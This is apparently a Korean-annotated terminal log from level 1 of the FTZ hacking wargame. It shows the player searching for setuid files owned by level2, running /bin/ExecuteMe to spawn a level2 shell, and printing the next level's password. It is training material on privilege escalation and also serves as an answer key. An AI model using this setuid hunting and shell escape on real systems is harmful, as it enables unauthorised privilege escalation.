login as: level1
level1@hhytruth's password:
[level1@ftz level1]$ ll	
###ll: long list..  ls -l과 같은 명령어로 디렉토리의 내용 목록 길게 보기
total 12
-rw-r--r--    1 root     root           47 Apr  4  2000 hint
drwxr-xr-x    2 root     level1       4096 Dec  7  2003 public_html
drwxrwxr-x    2 root     level1       4096 Jan 16  2009 tmp
[level1@ftz level1]$ cat hint	###hint 파일 내용 출력


level2 권한에 setuid가 걸린 파일을 찾는다.

###setuid: 걸린 파일이 실행되면 자신의 아이디가 root권한을 임시적으로 지님
###실행 후에 원래 아이디로 복구

[level1@ftz level1]$ find / -user level2 -perm -4000 2>/dev/null
### user가 level2이고 setuid가 걸린 파일을 서버에서 찾는다
### 2>/dev/null: standard error를 모두 버린다
/bin/ExecuteMe
[level1@ftz level1]$ /bin/ExecuteMe



                레벨2의 권한으로 당신이 원하는 명령어를
                한가지 실행시켜 드리겠습니다.
                (단, my-pass 와 chmod는 제외)

                어떤 명령을 실행시키겠습니까?


                [level2@ftz level2]$ bash
### bash 명령어로 level2의 권한 획득


[level2@ftz level2]$ my-pass

Level2 Password is "hacker or cracker".

[level2@ftz level2]$

